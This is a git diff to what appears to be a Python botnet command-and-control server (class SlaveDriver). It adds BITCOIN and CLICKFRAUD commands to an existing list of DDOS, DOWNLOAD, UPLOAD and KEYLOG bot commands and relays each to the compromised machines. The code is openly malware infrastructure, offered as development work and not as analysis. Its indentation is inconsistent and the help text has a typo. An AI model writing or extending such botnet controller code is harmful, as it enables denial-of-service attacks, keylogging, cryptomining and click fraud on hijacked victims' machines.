@@ -72,6 +72,15 @@ class SlaveDriver(basic.LineReceiver):
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
                 self.kserver.set(val,botcmd)
+                
+        if cmd == 'BITCOIN':
+        	print("This feature isn't fully implemented, should work but highly insecure and slow")
+       	if cmd == 'CLICKFRAUD':
+       		for key,val in self.slaves.iteritems():
+       			output = 'Starting CLICKFRAUD for bot {0}\n'.format(key)
+                self.transport.write(output)
+                botcmd = str(self.count) + " " + line
+                self.kserver.set(val,botcmd)
 
 
 
@@ -85,14 +94,14 @@ class SlaveDriver(basic.LineReceiver):
         self.transport.write('>>> ')
 
     def handlecmd(self, line):
-    	commands = ['DDOS','DOWNLOAD','UPLOAD','KEYLOG']
+    	commands = ['DDOS','DOWNLOAD','UPLOAD','KEYLOG', 'BITCOIN', 'CLICKFRAUD']
     	#parse out actual command
     	tmp = line.split(' ')
     	cmd = tmp[0].upper()
     	if cmd not in commands:
     		#output to input
     		self.transport.write('Invalid Command\n')
-    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], KEYLOG\n')
+    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], BITCOING [username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n')
     	else:
     		self.commands += 1
             self.parsecommands(line) #pass line for instructions that have more than one argument
